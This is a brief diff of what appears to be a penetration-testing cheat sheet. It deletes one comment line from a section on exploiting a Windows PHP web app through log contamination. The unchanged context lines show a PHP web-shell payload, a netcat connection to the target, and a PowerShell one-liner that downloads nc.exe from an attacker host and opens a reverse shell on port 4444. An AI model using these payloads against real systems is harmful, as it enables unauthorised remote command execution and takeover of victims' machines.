@@ -128,7 +128,6 @@ gcc -m32|-m64 -o output source.c
 # Vulnerable web app on Windows + PHP through contaminated logs
 nc $WINDOWSTARGET 80
 <?php system($_GET['cmd']);?>
-# urlencode cmd:
 powershell -Command "& {(New-Object System.Net.WebClient).DownloadFile('http://$ATTACKER/nc.exe','nc.exe'); cmd /c nc.exe $ATTACKER 4444 -e cmd.exe" }
 ```
 #### Remote File InclusionShell: Windows + PHP
